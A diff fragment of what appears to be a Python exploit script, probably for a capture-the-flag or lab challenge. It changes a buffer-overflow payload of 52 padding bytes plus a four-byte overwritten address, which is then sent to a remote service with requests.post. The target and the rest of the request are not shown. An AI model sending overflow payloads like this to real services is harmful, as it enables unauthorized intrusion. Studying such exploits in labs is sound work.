@@ -2,7 +2,7 @@ import base64
 import requests
 import sys
 
-payload = b"A" * 52 + bytes([0xFA, 0x93, 0x00, 0x42])
+payload = b"A" * 52 + bytes([0x62, 0x92, 0x00, 0x42])
 
 print(
     requests.post(
